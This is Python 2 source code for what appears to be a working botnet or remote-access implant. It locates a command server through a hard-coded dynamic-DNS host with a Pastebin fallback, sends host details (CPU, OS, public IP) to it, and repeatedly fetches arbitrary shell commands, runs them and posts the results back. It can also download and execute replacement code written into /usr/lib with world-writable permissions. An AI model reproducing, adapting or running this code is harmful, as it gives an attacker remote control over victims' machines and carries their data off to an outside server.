import urllib, urllib2, os, time, subprocess, uuid, ast

VERSION = "0.1"
LATEST_JOB_ID = {'public': '',
                 'private': ''}
ID = hex(uuid.getnode())


def get_server_ip():
    while True:
        try:
            server_ip = "http://xtremx.freemyip.com:8080/"
            urllib2.urlopen(server_ip, timeout=10)
        except:
            try:
                server_ip = urllib2.urlopen('https://pastebin.com/raw/BUdgMBtt', timeout=10).read()
                urllib2.urlopen(server_ip, timeout=10)
            except:
                time.sleep(300)
        else:
            break

    if server_ip[-1] == '/':
        return server_ip[:-1]
    return server_ip


def welcome():
    api = server_ip + '/welcome?ID=%s' % ID
    try:
        should = urllib2.urlopen(api, timeout=10).read()
    except:
        should = 'True'

    if should == 'True':
        cpu = execute_job(cmd='cat /proc/cpuinfo')
        os = execute_job(cmd='cat /etc/*release')
        IP = execute_job(cmd='wget -qO- ifconfig.co')
        values = {
            'ID': ID,
            'CPU': cpu,
            'OS': os,
            'IP': IP
        }
        data = urllib.urlencode(values)
        api = server_ip + '/welcome?ID=%s' % ID
        try:
            req = urllib2.Request(api, data, {'Content-Type': 'application/json'})
            urllib2.urlopen(req, timeout=10)
        except:
            pass


def get_latest_version():
    api = server_ip + '/origin/latestversion'
    try:
        return urllib2.urlopen(api, timeout=10).read()
    except:
        return VERSION


def update_origin():
    api = server_ip + '/origin?getorigin=origin'
    try:
        data = urllib2.urlopen(api, timeout=10).read()
        origin = '/usr/lib/origin_%s.py' % str(uuid.uuid4()).replace('-', '')[:8]
        with open(origin, 'w') as file:
            file.write(data)
        os.chmod(origin, 0777)
        subprocess.Popen(['python', origin])
        return True
    except:
        return False


def get_job_id():
    api = server_ip + '/jobs/latestjobid?ID=%s' % ID
    try:
        data = urllib2.urlopen(api, timeout=10).read()
        return ast.literal_eval(data)
    except:
        return LATEST_JOB_ID


def get_job(job_id):
    api = server_ip + '/jobs?jobid=%s' % job_id
    try:
        data = urllib2.urlopen(api, timeout=10).read()
        return data
    except:
        return 'whoami'


def post_job_result(cmd, job_result):
    global ID
    api = server_ip + '/jobs?ID=%s' % str(ID)
    values = {
        'CMD': str(cmd),
        'RESULT': str(job_result)
    }
    data = urllib.urlencode(values)
    try:
        req = urllib2.Request(api, data, {'Content-Type': 'application/json'})
        urllib2.urlopen(req, timeout=10)
    except:
        pass


def execute_job(cmd):
    try:
        data = subprocess.check_output(str(cmd), shell=True)
        return data
    except:
        try:
            data = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE)
            result = data.stdout.readlines()
            tmp = ''
            for item in result:
                tmp += item
            return tmp
        except:
            return ' [x] Execution failed!'

def fire():
    global LATEST_JOB_ID
    try:
        jobID = get_job_id()
        for key in jobID:
            if str(jobID[key]) != LATEST_JOB_ID[key]:
                LATEST_JOB_ID[key] = str(jobID[key])
                cmd = get_job(str(jobID[key]))
                result = execute_job(cmd)
                if result:
                    post_job_result(cmd, result)
    except:
        pass


if __name__ == "__main__":
    while True:
        try:
            server_ip = get_server_ip()
            latest_version = get_latest_version()
            try:
                float(latest_version)
            except:
                time.sleep(300)
                continue
            if latest_version != VERSION:
                break
            else:
                welcome()
                fire()
                time.sleep(10)
        except:
            time.sleep(300)

    while True:
        if update_origin():
            break
        else:
            time.sleep(300)
